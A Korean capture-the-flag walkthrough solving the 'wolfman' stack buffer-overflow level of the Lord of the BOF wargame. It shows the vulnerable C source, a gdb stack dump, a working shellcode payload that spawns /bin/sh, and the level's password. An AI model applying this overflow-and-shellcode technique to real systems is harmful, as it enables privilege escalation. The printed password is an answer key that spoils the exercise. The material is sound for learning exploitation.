# wolfman

```c
[orc@localhost orc]$ cat wolfman.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - wolfman
        - egghunter + buffer hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }
        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
```

orc 문제에서 return전에 buffer를 0으로 초기화시켜주는 조건이 추가된 문제이다.

orc문제에서 buffer에 쉘 코드를 넣었다면 여기선 buffer 뒤에 넣어주면 되겠지만 이미 뒤에 넣었으므로 똑같은 문제이다.

먼저 buffer의 시작 주소를 gdb를 통해 알아 낸다.

```bash
(gdb) r `python -c 'print "\x90"*47+"\xbf"'`
Starting program: /home/orc/attackme `python -c 'print "\x90"*47+"\xbf"'`

Breakpoint 1, 0x8048500 in main ()
(gdb) x/200x $esp
0xbffffb4c:     0x400309cb      0x00000002      0xbffffb94      0xbffffba0
0xbffffb5c:     0x40013868      0x00000002      0x08048450      0x00000000
0xbffffb6c:     0x08048471      0x08048500      0x00000002      0xbffffb94
0xbffffb7c:     0x08048390      0x0804861c      0x4000ae60      0xbffffb8c
0xbffffb8c:     0x40013e90      0x00000002      0xbffffc78      0xbffffc8b
0xbffffb9c:     0x00000000      0xbffffcbc      0xbffffcde      0xbffffce8
0xbffffbac:     0xbffffcf6      0xbffffd15      0xbffffd21      0xbffffd3d
0xbffffbbc:     0xbffffd56      0xbffffd61      0xbffffd6f      0xbffffdae
0xbffffbcc:     0xbffffdbd      0xbffffdd2      0xbffffde2      0xbffffdeb
0xbffffbdc:     0xbffffe06      0xbffffe11      0xbffffe1e      0xbffffe26
0xbffffbec:     0x00000000      0x00000003      0x08048034      0x00000004
0xbffffbfc:     0x00000020      0x00000005      0x00000006      0x00000006
0xbffffc0c:     0x00001000      0x00000007      0x40000000      0x00000008
0xbffffc1c:     0x00000000      0x00000009      0x08048450      0x0000000b
0xbffffc2c:     0x000001f8      0x0000000c      0x000001f8      0x0000000d
0xbffffc3c:     0x000001f8      0x0000000e      0x000001f8      0x00000010
0xbffffc4c:     0x0fabfbff      0x0000000f      0xbffffc73      0x00000000
0xbffffc5c:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc6c:     0x00000000      0x69000000      0x00363836      0x6d6f682f
0xbffffc7c:     0x726f2f65      0x74612f63      0x6b636174      0x9000656d
0xbffffc8c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc9c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffcac:     0x90909090      0x90909090      0x90909090      0x00bf9090
0xbffffcbc:     0x5353454c      0x4e45504f      0x752f7c3d      0x622f7273
0xbffffccc:     0x6c2f6e69      0x70737365      0x2e657069      0x25206873
0xbffffcdc:     0x53550073      0x414e5245      0x003d454d      0x54534948
0xbffffcec:     0x455a4953      0x3030313d      0x4f480030      0x414e5453
0xbffffcfc:     0x6c3d454d      0x6c61636f      0x74736f68      0x636f6c2e
0xbffffd0c:     0x6f646c61      0x6e69616d      0x474f4c00      0x454d414e
0xbffffd1c:     0x63726f3d      0x4d455200      0x4845544f      0x3d54534f
0xbffffd2c:     0x2e323931      0x2e383631      0x6574616e      0x6d6f632e
0xbffffd3c:     0x49414d00      0x762f3d4c      0x732f7261      0x6c6f6f70
0xbffffd4c:     0x69616d2f      0x726f2f6c      0x45540063      0x783d4d52
0xbffffd5c:     0x6d726574      0x534f4800      0x50595454      0x33693d45
0xbffffd6c:     0x50003638      0x3d485441      0x7273752f      0x636f6c2f
0xbffffd7c:     0x622f6c61      0x2f3a6e69      0x3a6e6962      0x7273752f
0xbffffd8c:     0x6e69622f      0x73752f3a      0x31582f72      0x2f365231
0xbffffd9c:     0x3a6e6962      0x6d6f682f      0x726f2f65      0x69622f63
0xbffffdac:     0x4f48006e      0x2f3d454d      0x656d6f68      0x63726f2f
0xbffffdbc:     0x504e4900      0x43525455      0x74652f3d      0x6e692f63
0xbffffdcc:     0x72747570      0x48530063      0x3d4c4c45      0x6e69622f
0xbffffddc:     0x7361622f      0x53550068      0x6f3d5245      0x42006372
0xbffffdec:     0x5f485341      0x3d564e45      0x6d6f682f      0x726f2f65
0xbffffdfc:     0x622e2f63      0x72687361      0x414c0063      0x653d474e
0xbffffe0c:     0x53555f6e      0x54534f00      0x3d455059      0x756e694c
0xbffffe1c:     0x48530078      0x3d4c564c      0x534c0031      0x4c4f435f
0xbffffe2c:     0x3d53524f      0x303d6f6e      0x69663a30      0x3a30303d
0xbffffe3c:     0x303d6964      0x34333b31      0x3d6e6c3a      0x333b3130
0xbffffe4c:     0x69703a36      0x3b30343d      0x733a3333      0x31303d6f
0xbffffe5c:     0x3a35333b      0x343d6462      0x33333b30      0x3a31303b
(gdb) ni
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
```

일단 0xbffffc58이 buffer의 시작 주소라는 것을 알 수 있고 48번째 byte에 '\xbf'를 넣었더니 

'stack is still your friend'라는 메세지가 뜨지 않으므로 제대로 입력됐음을 알 수 있다.

그럼 이제 buffer부분은 다 NOP을 주고 ret자리에 시작 주소를 주고 뒤에 NOP sled와 쉘 코드를 주면 해결!

```bash
[orc@localhost orc]$ ./wolfman `python -c 'print "\x90"*44+"\x58\xfc\xff\xbf"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒X▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
                                                                    ̀1▒̀
Illegal instruction
```

깜빡하고 NOP sled를 주지 않았더니 주소부분이랑 엮인건지 'Illegal istruction'이라는 메세지가 뜬다;

다시 제대로 해보자

```bash
[orc@localhost orc]$ ./wolfman `python -c 'print "\x90"*44+"\x58\xfc\xff\xbf"+"\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒X▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
                                                   ̀1▒̀
bash$ whoami
wolfman
bash$ my-pass
euid = 505
love eyuna
```

wolfman의 password는 love eyuna이다.